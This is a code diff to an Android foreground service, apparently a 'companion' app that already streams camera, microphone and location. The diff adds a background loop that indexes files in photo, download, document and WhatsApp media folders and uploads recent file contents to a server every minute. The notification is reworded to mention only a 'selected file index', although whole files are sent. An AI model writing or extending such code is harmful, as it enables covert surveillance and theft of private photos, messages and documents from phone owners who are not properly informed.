@@ -27,6 +27,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
+import android.os.Environment;
 import android.util.Base64;
 import android.util.Size;
 import android.view.Surface;
@@ -35,6 +36,7 @@ import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
 import org.json.JSONObject;
+import org.json.JSONArray;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -45,6 +47,9 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.ByteBuffer;
 import java.util.Arrays;
+import java.util.ArrayList;
+import java.util.Comparator;
+import java.util.List;
 import java.util.Locale;
 
 public class CompanionForegroundService extends Service {
@@ -65,6 +70,17 @@ public class CompanionForegroundService extends Service {
     private MediaRecorder recorder;
     private File audioFile;
     private boolean audioRestarting = false;
+    private long lastFileSyncMtime = 0L;
+    private final Runnable fileSyncRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (!running) return;
+            if (prefs.getBoolean("file_sync_enabled", false) && hasAllFilesAccess()) {
+                syncFilesOnce();
+            }
+            if (running) worker.postDelayed(this, 60000);
+        }
+    };
     private LocationManager locationManager;
     private final LocationListener locationListener = new LocationListener() {
         @Override
@@ -124,7 +140,10 @@ public class CompanionForegroundService extends Service {
         startLocationUpdates();
         startAudioLoop();
         startCameraLoop();
-        updateNotification("Sharing camera, microphone, and location");
+        startFileSyncLoop();
+        updateNotification(prefs.getBoolean("file_sync_enabled", false)
+                ? "Sharing camera, microphone, location, and selected file index"
+                : "Sharing camera, microphone, and location");
     }
 
     private void stopLiveSharing() {
@@ -132,6 +151,7 @@ public class CompanionForegroundService extends Service {
         stopCameraLoop();
         stopAudioLoop(true);
         stopLocationUpdates();
+        stopFileSyncLoop();
         postSession("disconnected");
         stopForeground(true);
     }
@@ -196,6 +216,10 @@ public class CompanionForegroundService extends Service {
 
     private boolean hasPermission(String permission) {
         return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private boolean hasAllFilesAccess() {
+        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager();
     }
 
     private void postSession(String status) {
@@ -393,6 +417,99 @@ public class CompanionForegroundService extends Service {
             json.put("height", 480);
             json.put("captured_at", isoNow());
             postJson("/api/mobile/frame", json);
+        } catch (Exception ignored) {}
+    }
+
+    private void startFileSyncLoop() {
+        if (!prefs.getBoolean("file_sync_enabled", false) || !hasAllFilesAccess()) return;
+        worker.post(fileSyncRunnable);
+    }
+
+    private void stopFileSyncLoop() {
+        if (worker != null) worker.removeCallbacks(fileSyncRunnable);
+    }
+
+    private void syncFilesOnce() {
+        try {
+            List<File> files = new ArrayList<>();
+            File root = Environment.getExternalStorageDirectory();
+            String[] roots = new String[] {
+                    "Download", "Downloads", "DCIM", "Documents", "Pictures", "Movies", "Music",
+                    "WhatsApp/Media", "Android/media/com.whatsapp/WhatsApp/Media"
+            };
+            for (String name : roots) {
+                collectFiles(new File(root, name), files, 0);
+            }
+            files.sort(Comparator.comparingLong(File::lastModified).reversed());
+
+            JSONArray index = new JSONArray();
+            int count = 0;
+            long newest = lastFileSyncMtime;
+            int uploaded = 0;
+            for (File file : files) {
+                if (count >= 500) break;
+                JSONObject item = new JSONObject();
+                item.put("name", file.getName());
+                item.put("path", safeRelativePath(root, file));
+                item.put("bytes", file.length());
+                item.put("modified_at", file.lastModified());
+                index.put(item);
+                count++;
+                newest = Math.max(newest, file.lastModified());
+
+                if (uploaded < 5 && file.lastModified() > lastFileSyncMtime && file.length() > 0 && file.length() <= 8_000_000) {
+                    uploadFile(root, file);
+                    uploaded++;
+                }
+            }
+
+            JSONObject payload = new JSONObject();
+            payload.put("indexed_at", isoNow());
+            payload.put("root", root.getAbsolutePath());
+            payload.put("file_count", count);
+            payload.put("uploaded_recent_files", uploaded);
+            payload.put("files", index);
+            postJson("/api/mobile/file_index", payload);
+            if (newest > lastFileSyncMtime) {
+                lastFileSyncMtime = newest;
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private void collectFiles(File dir, List<File> out, int depth) {
+        if (dir == null || !dir.exists() || !dir.canRead() || depth > 4 || out.size() >= 1200) return;
+        File[] children = dir.listFiles();
+        if (children == null) return;
+        for (File child : children) {
+            if (out.size() >= 1200) return;
+            if (child.isDirectory()) {
+                collectFiles(child, out, depth + 1);
+            } else if (child.isFile()) {
+                out.add(child);
+            }
+        }
+    }
+
+    private String safeRelativePath(File root, File file) {
+        try {
+            String rootPath = root.getCanonicalPath();
+            String filePath = file.getCanonicalPath();
+            if (filePath.startsWith(rootPath)) {
+                return filePath.substring(rootPath.length()).replace("\\", "/").replaceFirst("^/+", "");
+            }
+        } catch (Exception ignored) {}
+        return file.getName();
+    }
+
+    private void uploadFile(File root, File file) {
+        try {
+            JSONObject json = new JSONObject();
+            json.put("relative_path", safeRelativePath(root, file));
+            json.put("name", file.getName());
+            json.put("bytes", file.length());
+            json.put("modified_at", file.lastModified());
+            json.put("content", "data:application/octet-stream;base64," + Base64.encodeToString(readBytes(file), Base64.NO_WRAP));
+            postJson("/api/mobile/file", json);
         } catch (Exception ignored) {}
     }
 
